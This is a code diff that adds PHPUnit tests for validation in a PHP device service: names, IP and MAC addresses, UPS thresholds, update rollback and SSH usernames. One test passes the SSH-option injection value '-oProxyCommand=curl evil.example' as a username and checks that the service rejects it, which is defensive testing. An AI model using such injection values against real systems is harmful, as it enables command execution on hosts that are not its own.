@@ -19,6 +19,47 @@ class DeviceServiceTest extends TestCase
 {
     use EntityTestHelperTrait;
 
+    public function testCreateDeviceRejectsBlankName(): void
+    {
+        $deviceRepository = $this->createMock(DeviceRepository::class);
+        $deviceRepository->expects($this->never())->method('findOneByName');
+
+        $service = new DeviceService(
+            $this->createMock(EntityManagerInterface::class),
+            $deviceRepository,
+            $this->createMock(UpsRepository::class)
+        );
+
+        $this->expectException(InvalidArgumentException::class);
+        $this->expectExceptionMessage('Device name cannot be empty.');
+
+        $service->createDevice('   ', '10.0.0.1', '00:11:22:33:44:55', DevicePlatform::LINUX->value);
+    }
+
+    public function testCreateDeviceRejectsNegativeThreshold(): void
+    {
+        $deviceRepository = $this->createMock(DeviceRepository::class);
+        $deviceRepository->expects($this->never())->method('findOneByName');
+
+        $service = new DeviceService(
+            $this->createMock(EntityManagerInterface::class),
+            $deviceRepository,
+            $this->createMock(UpsRepository::class)
+        );
+
+        $this->expectException(InvalidArgumentException::class);
+        $this->expectExceptionMessage('UPS low battery runtime threshold cannot be negative.');
+
+        $service->createDevice(
+            'node-1',
+            '10.0.0.1',
+            '00:11:22:33:44:55',
+            DevicePlatform::LINUX->value,
+            null,
+            -60
+        );
+    }
+
     public function testCreateDeviceThrowsForUnsupportedPlatform(): void
     {
         $entityManager = $this->createMock(EntityManagerInterface::class);
@@ -35,6 +76,77 @@ class DeviceServiceTest extends TestCase
         $this->expectExceptionMessage("Unsupported platform 'unsupported-platform'");
 
         $service->createDevice('node-1', '10.0.0.10', '00:11:22:33:44:55', 'unsupported-platform');
+    }
+
+    public function testCreateDeviceThrowsForInvalidIp(): void
+    {
+        $entityManager = $this->createMock(EntityManagerInterface::class);
+        $deviceRepository = $this->createMock(DeviceRepository::class);
+        $upsRepository = $this->createMock(UpsRepository::class);
+
+        $deviceRepository->expects($this->never())->method('findOneByName');
+        $entityManager->expects($this->never())->method('persist');
+
+        $service = new DeviceService($entityManager, $deviceRepository, $upsRepository);
+
+        $this->expectException(InvalidArgumentException::class);
+        $this->expectExceptionMessage("'999.0.0.1' is not a valid IP address.");
+
+        $service->createDevice('node-1', '999.0.0.1', '00:11:22:33:44:55', DevicePlatform::GENERIC->value);
+    }
+
+    public function testCreateDeviceThrowsForInvalidMac(): void
+    {
+        $entityManager = $this->createMock(EntityManagerInterface::class);
+        $deviceRepository = $this->createMock(DeviceRepository::class);
+        $upsRepository = $this->createMock(UpsRepository::class);
+
+        $deviceRepository->expects($this->never())->method('findOneByName');
+        $entityManager->expects($this->never())->method('persist');
+
+        $service = new DeviceService($entityManager, $deviceRepository, $upsRepository);
+
+        $this->expectException(InvalidArgumentException::class);
+        $this->expectExceptionMessage("'not-a-mac' is not a valid MAC address");
+
+        $service->createDevice('node-1', '10.0.0.10', 'not-a-mac', DevicePlatform::GENERIC->value);
+    }
+
+    public function testUpdateDeviceRejectsInvalidIpBeforeTouchingTheEntity(): void
+    {
+        $entityManager = $this->createMock(EntityManagerInterface::class);
+        $deviceRepository = $this->createMock(DeviceRepository::class);
+        $upsRepository = $this->createMock(UpsRepository::class);
+
+        $deviceRepository->expects($this->never())->method('findById');
+        $entityManager->expects($this->never())->method('flush');
+
+        $service = new DeviceService($entityManager, $deviceRepository, $upsRepository);
+
+        $this->expectException(InvalidArgumentException::class);
+        $this->expectExceptionMessage("'nope' is not a valid IP address.");
+
+        $service->updateDevice(1, 'node-1', 'nope', '00:11:22:33:44:55', DevicePlatform::GENERIC->value);
+    }
+
+    public function testCreateDeviceTrimsSurroundingWhitespaceFromIpAndMac(): void
+    {
+        $entityManager = $this->createMock(EntityManagerInterface::class);
+        $deviceRepository = $this->createMock(DeviceRepository::class);
+        $upsRepository = $this->createMock(UpsRepository::class);
+
+        $deviceRepository->expects($this->once())->method('findOneByName')->with('node-1')->willReturn(null);
+
+        $service = new DeviceService($entityManager, $deviceRepository, $upsRepository);
+        $device = $service->createDevice(
+            'node-1',
+            '  10.0.0.10  ',
+            "\t00:11:22:33:44:55\n",
+            DevicePlatform::GENERIC->value
+        );
+
+        $this->assertSame('10.0.0.10', $device->getIp());
+        $this->assertSame('00:11:22:33:44:55', $device->getMac());
     }
 
     public function testCreateDeviceThrowsWhenNameAlreadyExists(): void
@@ -158,6 +270,83 @@ class DeviceServiceTest extends TestCase
         $this->expectExceptionMessage("Device with name 'node-2' already exists.");
 
         $service->updateDevice(1, 'node-2', '10.0.0.11', '00:11:22:33:44:66', DevicePlatform::LINUX->value);
+    }
+
+    public function testUpdateDeviceLeavesTheEntityUntouchedWhenTheUpsCannotBeResolved(): void
+    {
+        $entityManager = $this->createMock(EntityManagerInterface::class);
+        $deviceRepository = $this->createMock(DeviceRepository::class);
+        $upsRepository = $this->createMock(UpsRepository::class);
+        $currentDevice = $this->createDeviceEntity(1, 'node-1', '10.0.0.10', '00:11:22:33:44:55');
+
+        $deviceRepository->expects($this->once())->method('findById')->with(1)->willReturn($currentDevice);
+        $deviceRepository->expects($this->once())->method('findOneByName')->willReturn($currentDevice);
+        $upsRepository->expects($this->once())->method('findById')->with(99)->willReturn(null);
+        $entityManager->expects($this->never())->method('flush');
+
+        $service = new DeviceService($entityManager, $deviceRepository, $upsRepository);
+
+        try {
+            $service->updateDevice(
+                1,
+                'node-renamed',
+                '10.9.9.9',
+                'aa:bb:cc:dd:ee:ff',
+                DevicePlatform::UBUNTU->value,
+                null,
+                null,
+                99
+            );
+            $this->fail('Expected EntityNotFound for the unresolvable UPS id.');
+        } catch (EntityNotFound) {
+            // The managed entity must not carry a half-applied update, because a
+            // later flush anywhere in the process would persist it.
+            $this->assertSame('node-1', $currentDevice->getName());
+            $this->assertSame('10.0.0.10', $currentDevice->getIp());
+            $this->assertSame('00:11:22:33:44:55', $currentDevice->getMac());
+        }
+    }
+
+    public function testUpdateDeviceRejectsUsernameThatWouldBeParsedAsAnSshOption(): void
+    {
+        $deviceRepository = $this->createMock(DeviceRepository::class);
+        $deviceRepository->expects($this->never())->method('findById');
+
+        $service = new DeviceService(
+            $this->createMock(EntityManagerInterface::class),
+            $deviceRepository,
+            $this->createMock(UpsRepository::class)
+        );
+
+        $this->expectException(InvalidArgumentException::class);
+        $this->expectExceptionMessage('is not a valid SSH username');
+
+        $service->updateDevice(
+            1,
+            'node-1',
+            '10.0.0.10',
+            '00:11:22:33:44:55',
+            DevicePlatform::LINUX->value,
+            '-oProxyCommand=curl evil.example'
+        );
+    }
+
+    public function testCreateDeviceTreatsBlankUsernameAsUnset(): void
+    {
+        $entityManager = $this->createStub(EntityManagerInterface::class);
+        $deviceRepository = $this->createMock(DeviceRepository::class);
+        $deviceRepository->expects($this->once())->method('findOneByName')->willReturn(null);
+
+        $service = new DeviceService($entityManager, $deviceRepository, $this->createStub(UpsRepository::class));
+        $device = $service->createDevice(
+            'node-1',
+            '10.0.0.10',
+            '00:11:22:33:44:55',
+            DevicePlatform::LINUX->value,
+            '   '
+        );
+
+        $this->assertNull($device->getUsername());
     }
 
     public function testUpdateDeviceFlushesWhenUsingCurrentDeviceName(): void
